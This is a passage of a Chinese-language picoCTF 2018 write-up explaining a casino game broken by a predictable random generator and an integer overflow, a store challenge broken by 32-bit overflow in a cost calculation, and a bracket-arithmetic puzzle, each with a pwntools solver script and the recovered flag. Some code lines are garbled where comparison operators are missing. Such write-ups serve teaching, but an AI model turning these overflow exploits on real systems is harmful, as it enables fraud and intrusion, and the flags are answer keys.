        long get_long() {
     printf("> ");
     uint64_t l = 0;
     char c = 0;
     while(!is_digit(c))
       c = getchar();
     while(is_digit(c)) {
         // bug2
       if(l >= LONG_MAX) {
     l = LONG_MAX;
     break;
       }
       l *= 10;
       l += c - '0';
       c = getchar();
     }
     while(c != '\n')
       c = getchar();
     return l;
    }
乍一看好像没问题, 我们貌似没法溢出. 但仔细手模一下会发现, 判断溢出的代码写在`while`语句开头的地方, 也就是说, 我们输入的数字s,
只要s[:-1]转换成long没有溢出, 但是整个串还是可以溢出！因为溢出我们输入的是回车字符, 就可以直接跳出循环.
根据程序思路, 有两个要求要满足, 要`cash > ONE_BILLION` 和 `wins > HOTSRWAK(3)`才能拿到flag.  
于是整体思路整理如下:
  1. 利用伪随机赢下三次
  2. 利用长整型溢出漏洞拿到flag
exp如下:
    #coding:utf-8
    import re,subprocess
    from pwn import *
    sh = remote('2018shell2.picoctf.com', 25443)
    m1 = sh.recvuntil('> ')
    balance = re.findall('\$(\d{1,4})', m1)[0]
    rand = subprocess.check_output(['./rand', balance]).split('\n')
    print 'round 1...'
    sh.sendline('1')
    sh.recvuntil('> ')
    sh.sendline(rand[0])
    sh.recvuntil('> ')
    print 'round 2...'
    sh.sendline('1')
    sh.recvuntil('> ')
    sh.sendline(rand[2])
    sh.recvuntil('> ')
    print 'round 3...'
    sh.sendline('1')
    sh.recvuntil('> ')
    sh.sendline(rand[4])
    sh.recvuntil('> ')
    print 'getting flag...'
    sh.sendline('3294967296')
    sh.recvuntil('> ')
    sh.sendline(str(int(rand[6])+1))
    sh.recvuntil('flag!\n')
    print sh.recv()
    # picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8b7aef91}
# Store (400pts)
## 题目
We started a little [store
[1]](https://2018shell2.picoctf.com/static/5f775969757dd025afe50827eb9db223/store)
, can you buy the flag? [Source
[2]](https://2018shell2.picoctf.com/static/5f775969757dd025afe50827eb9db223/source.c)
. Connect with 2018shell2.picoctf.com 53220.
> Hints:  
>  (1) Two's compliment can do some weird things when numbers get really big!
## 题解
题目提示补码, 顺着题意, 题目大概就是一个模拟商店, 卖两种商品, 一个是仿制的flag, 一个1000. 一个是真flag, 需要100000.
初始金钱只有1100. 程序中有加减乘除的地方就是买假flag的地方:
    if(auction_choice == 1){
                    printf("Imitation Flags cost 1000 each, how many would you like?\n");
                    int number_flags = 0;
                    fflush(stdin);
                    scanf("%d", &number_flags);
                    if(number_flags > 0){
                        int total_cost = 0;
                        total_cost = 1000*number_flags; // 这里
                        printf("\nYour total cost is: %d\n", total_cost);
                        if(total_cost  100000
我们算出一个值, `4294868`输入给`number_flags`即可获得flag. exp如下
    #coding:utf-8
    from pwn import *
    import re
    context.log_level = "error"
    sh = remote("2018shell2.picoctf.com",53220)
    sh.recv()
    sh.sendline('2')
    sh.recv()
    sh.sendline('1')
    sh.recv()
    sh.sendline('4294868')
    sh.recv()
    sh.sendline('2')
    sh.recv()
    sh.sendline('2')
    sh.recv()
    sh.sendline('1')
    sh.recv()
    msg = sh.recv()
    flag = re.findall("(picoCTF{.*})", msg)[0]
    print flag # picoCTF{numb3r3_4r3nt_s4f3_cbb7151f}
# script me (500pts)
## 题目
Can you understand the language and answer the questions to retrieve the flag?
Connect to the service with nc 2018shell2.picoctf.com 8672
> Hints:  
>  (1) Maybe try writing a python script?
## 题解
这道题很有意思, 根据给出的一些计算规则, 计算复杂的组合式.
    () + () = ()()                                      => [combine]
    ((())) + () = ((())())                              => [absorb-right]
    () + ((())) = (()(()))                              => [absorb-left]
    (())(()) + () = (())(()())                          => [combined-absorb-right]
    () + (())(()) = (()())(())                          => [combined-absorb-left]
    (())(()) + ((())) = ((())(())(()))                  => [absorb-combined-right]
    ((())) + (())(()) = ((())(())(()))                  => [absorb-combined-left]
    () + (()) + ((())) = (()()) + ((())) = ((()())(())) => [left-associative]
仔细观察题目可以发现, 这些计算规则无非就是结合与左右吸收, 结合就是简单连接, 左右吸收都是简单的吸收到第一个半括号内.
我们需要寻找的就是什么时候做这些操作. 也就是说, 他是根据什么来判断是该结合还是该左吸收还是右吸收. 我这里发现一个规律(当然可能并不是唯一解):
判断的原则是表达式中的括号的最大深度. 比如`()`深度是1, `(())`深度是2, `(())(())`深度也是2. 于是拿到一个简单的二元表达式,
计算思路是:
  1. 计算两个元素s1, s2的最大深度w1, w2.
  2. 如果w1==w2相等, 则直接`combine`, return s1+s2; 
  3. 如果w1>w2, 则 return s1[:-1] + s2 + s1[-1];
  4. 如果w1wm:
                wm = w
        return wm
    def add(e1,e2):
        w1 = get_weight(e1)
        w2 = get_weight(e2)
        if w1 == w2:
            return e1+e2
        elif w1>w2:
            return e1[:-1] + e2 + e1[-1]
        else:
            return e2[0] + e1 + e2[1:]
    def calc(ea):
        r = ea[0]
        for i in range(1, len(ea)):
            r = add(r, ea[i])
        return r
    print 'connecting...'
    sh = remote('2018shell2.picoctf.com', 8672)
    sh.recvuntil('.\n')
    print 'round 1...'
    e = sh.recvline().split(' = ')[0]
    a = calc(e.split(' + '))
    sh.recvuntil('> ')
    sh.sendline(a)
    for i in range(4):
        print 'round '+ str(i+2) +'...'
        e = re.findall('(\([() +]+\))', sh.recvuntil('> '))[0]
        a = calc(e.split(' + '))
        sh.sendline(a)
    print 'receiving flag...'
    sh.recvuntil('flag')
    flag = re.findall('(picoCTF{.*})', sh.recv())[0]
    print flag # picoCTF{5cr1pt1nG_l1k3_4_pRo_0970eb2d}